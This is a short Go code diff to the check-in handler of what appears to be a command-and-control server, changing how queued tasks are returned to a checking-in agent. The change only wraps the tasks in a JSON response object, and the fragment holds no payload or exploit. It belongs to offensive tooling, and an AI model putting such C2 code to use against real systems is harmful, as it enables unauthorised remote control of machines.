@@ -50,7 +50,19 @@ func (cc *CheckInController) Checkin(ctx *gin.Context) {
 			return
 		}
 
-		ctx.JSON(http.StatusOK, tasks)
+		tasksJSON, err := json.Marshal(tasks)
+		if err != nil {
+			ctx.JSON(http.StatusInternalServerError, gin.H{"error": "failed to marshal tasks to JSON"})
+			return
+		}
+
+		var c2response models.C2Request
+
+		c2response.AgentID = c2request.AgentID
+		c2response.Reason = "task"
+		c2response.Message = string(tasksJSON)
+
+		ctx.JSON(http.StatusOK, c2response)
 
 	} else if c2request.Reason == "response" {
 
